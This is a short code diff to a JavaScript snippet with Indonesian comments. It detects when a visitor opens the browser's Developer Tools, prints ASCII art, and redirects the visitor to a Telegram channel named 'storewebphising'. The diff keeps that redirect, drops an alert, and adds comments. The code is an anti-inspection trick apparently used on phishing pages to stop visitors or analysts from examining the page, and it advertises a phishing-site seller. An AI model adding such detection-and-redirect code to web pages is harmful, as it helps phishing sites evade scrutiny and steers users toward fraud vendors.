@@ -1,4 +1,3 @@
-
 (function() {
     // Menampilkan ASCII art saat konsol dibuka
     var asciiArt = `
@@ -26,9 +25,8 @@
     // Menambahkan pesan saat Developer Tools dibuka
     var devtools = /./;
     devtools.toString = function() {
-        alert('manyu store');
-        console.log(asciiArt);
-        window.location.href = 'https://t.me/storewebphising';
+        console.log(asciiArt);  // Menampilkan ASCII art di konsol
+        window.location.href = 'https://t.me/storewebphising';  // Mengarahkan ke URL
     };
-    console.log(devtools);
+    console.log(devtools);  // Memicu untuk membuka devtools
 })();
